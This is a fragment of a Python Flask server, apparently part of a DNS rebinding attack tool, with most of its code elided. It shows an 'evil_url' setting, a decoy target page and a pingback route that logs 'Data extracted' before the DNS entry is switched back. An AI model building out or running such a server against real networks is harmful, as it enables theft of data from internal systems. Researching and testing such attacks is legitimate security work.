...
DEFAULT_SCHEMA = "http"
DEFAULT_PORT = "8080"
DEFAULT_PINGBACK_PATH = "/getcontent"
...
def generate_urls(args):
    ...
    print("Working on {}".format(app.config['evil_url']))
...
@app.route("/")
def index():
    return "This is target page dont attack"
...
def pingback():
    print("Data extracted. Switch back the DNS entry...")
    return "OK"
